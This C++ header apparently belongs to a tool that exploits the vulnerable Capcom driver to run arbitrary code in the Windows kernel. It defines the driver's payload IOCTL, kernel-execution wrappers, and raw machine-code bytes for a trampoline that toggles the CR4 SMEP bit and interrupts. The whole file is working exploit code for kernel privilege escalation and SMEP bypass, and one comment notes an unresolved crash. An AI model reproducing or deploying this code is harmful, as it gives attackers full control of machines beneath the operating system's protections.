#pragma once
#include <windows.h>
#include <winternl.h>
#include "CapcomLockMemory.h"

/********* BASIC WRAPPER *********/

#define IOCTL_RunPayload64  0xAA013044
#define PAYLOAD_BUFFER_SIZE 0x200

typedef PVOID(NTAPI* MmGetSystemRoutineAddress_t)(PUNICODE_STRING);
typedef VOID(NTAPI* UserFunc)(MmGetSystemRoutineAddress_t, PVOID userData);
static HANDLE device;

struct CapcomCodePayload {
    BYTE* pointerToPayload;
    BYTE  payload[PAYLOAD_BUFFER_SIZE];
};

BOOL InitDriver();
FARPROC GetKernelRoutine(MmGetSystemRoutineAddress_t, const wchar_t*);
void RunInKernel(UserFunc func, PVOID userData);


/********* CALLS WITH ENABLED INTERRUPT *********/

using trampolineCall = uint64_t( *)(...);
using freeCall = uint64_t(__fastcall*)(...);

// NON_PAGED_DATA static PVOID(NTAPI* ExAllocatePoolPtr)(unsigned __int64 poolType, SIZE_T numberOfBytes);
NON_PAGED_DATA static freeCall ExAllocatePoolPtr = 0;
NON_PAGED_DATA static trampolineCall TrampolineFuncPtr = 0;

static const uint32_t intAndSmepHandlingTrampolineStoreOffset = 0x34;
static const uint32_t intAndSmepHandlingTrampolineEnabledOffset = 0xB;
NON_PAGED_DATA static UCHAR intAndSmepHandlingTrampoline[] = {
	0x0F, 0x20, 0xE0,                                // mov    rax,cr4               ; -
	0x48, 0x0F, 0xBA, 0xE8, 0x14,                    // bts    rax,0x14              ; will be nop'd if no SMEP support
	0x0F, 0x22, 0xE0,                                // mov    cr4,rax               ; -
	0xFB,                                            // sti
	0x48, 0x8D, 0x05, 0x07, 0x00, 0x00, 0x00,        // lea    rax,[rip+0x7]         ; continue
	0x8F, 0x40, 0x12,                                // pop    QWORD PTR [rax+0x12]  ; ret_store
	0x50,                                            // push rax
	0xFF, 0x60, 0x1A,                                // jmp    QWORD PTR [rax+0x1a]  ; call_store
	0xFA,                                            // cli
	0x0F, 0x20, 0xE1,                                // mov    rcx,cr4
	0x48, 0x0F, 0xBA, 0xF1, 0x14,                    // btr    rcx,0x14
	0x0F, 0x22, 0xE1,                                // mov    cr4,rcx
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,              // jmp    QWORD PTR [rip+0x0]   ; ret_store

	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret_store:  dq 0
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // call_store: dq 0
};


NON_PAGED_CODE void __stdcall CreateIntSmepTrampoline(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData);
void initIntSmepTrampoline();

template<typename ...Params>
NON_PAGED_CODE static uint64_t CallWithInterruptsAndSmep(PVOID ptr, Params &&... params) {
	// this is where the crash happens, possibly because the memory that TrampolineFuncPtr points to gets paged out
	*(PVOID*)(((PUCHAR)TrampolineFuncPtr) + intAndSmepHandlingTrampolineStoreOffset) = ptr;
	return TrampolineFuncPtr(std::forward<Params>(params)...);
	// return 0;
}